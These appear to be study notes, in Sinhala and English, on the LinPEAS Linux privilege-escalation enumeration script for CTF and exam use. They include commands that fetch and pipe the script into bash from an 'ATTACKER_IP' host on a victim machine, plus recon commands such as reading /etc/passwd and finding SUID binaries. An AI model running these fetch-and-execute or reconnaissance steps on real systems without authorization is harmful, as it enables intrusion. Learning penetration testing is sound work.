# 📌 LinPEAS (Linux Privilege Escalation) – Quick Notes

## 🔹 LinPEAS කියන්නේ?

**linPEAS** කියන්නේ Linux system එකක  
➡️ **low‑privilege user → root** යන්න පුළුවන් paths හොයන  
➡️ **Local Privilege Escalation enumeration script** එකක්.

---

## 🔹 VERY IMPORTANT RULE

> **linPEAS run වෙන්නේ victim machine එකේ**  
> **Attacker machine එකේ නෙවෙයි**

---

## 🔹 Roles

### 🟢 Attacker Machine (Kali)

- linpeas.sh download කරනවා
    
- Web server එකක් host කරනවා
    
- File transfer source එක විතරයි
    

### 🔴 Victim Machine

- Already shell එකක් තියෙනවා
    
- linPEAS **execute කරන machine එක**
    

---

## 🔹 Standard Workflow

### 1️⃣ Attacker machine (Kali)

`wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh python3 -m http.server 8000`

---

### 2️⃣ Victim machine – Download

`wget http://ATTACKER_IP:8000/linpeas.sh chmod +x linpeas.sh`

OR (disk save නැතුව)

`curl http://ATTACKER_IP:8000/linpeas.sh | bash`

---

### 3️⃣ Victim machine – Run

`./linpeas.sh`

---

## 🔹 curl | bash meaning

`curl http://IP/linpeas.sh | bash`

- curl → script download
    
- | → pipe
    
- bash → script execute
    
- 👉 **Runs on victim system**
    

---

## 🔹 Why not direct internet (GitHub)?

- Victim machine often:
    
    - ❌ No internet
        
    - ❌ GitHub blocked
        
- ✔️ Attacker IP allowed
    
- ✔️ More stealth & control
    

---

## 🔹 What linPEAS checks

- OS & Kernel version
    
- Current user & groups
    
- `sudo -l` permissions
    
- Running processes
    
- Open ports & services
    
- SUID binaries
    
- Writable files & folders
    
- Cron jobs
    
- Config files (passwords, keys)
    
- Vulnerable software
    

---

## 🔹 Important commands linPEAS internally uses

`id uname -a sudo -l ps aux find / -perm -4000 2>/dev/null cat /etc/passwd`

---

## 🔹 Output colors (CTF important 🎯)

- 🔴 **Red** → High chance privilege escalation
    
- 🟡 **Yellow** → Interesting, check manually
    
- ⚪ Normal → Info only
    

---

## 🔹 linPEAS DOES NOT

❌ Give root shell automatically  
❌ Hack remotely

✔️ Only **shows possible paths**

👉 You must exploit manually

---

## 🔹 Common Privilege Escalation paths linPEAS shows

- Sudo NOPASSWD commands
    
- Writable cron jobs
    
- Writable root scripts
    
- SUID binaries
    
- Weak file permissions
    
- Vulnerable services (MySQL, MongoDB, etc.)
    

---

## 🔹 One‑line memory trick 🧠

> **Download from attacker → Run on victim → Exploit manually**

---

## 🔹 Exam / Interview answer 📝

> _LinPEAS is a local Linux privilege escalation enumeration script that must be executed on the victim system to identify misconfigurations that allow escalation to root._

---

## 🔥 TL;DR

`Attacker = host linpeas Victim   = run linpeas linPEAS  = find privesc You      = exploit`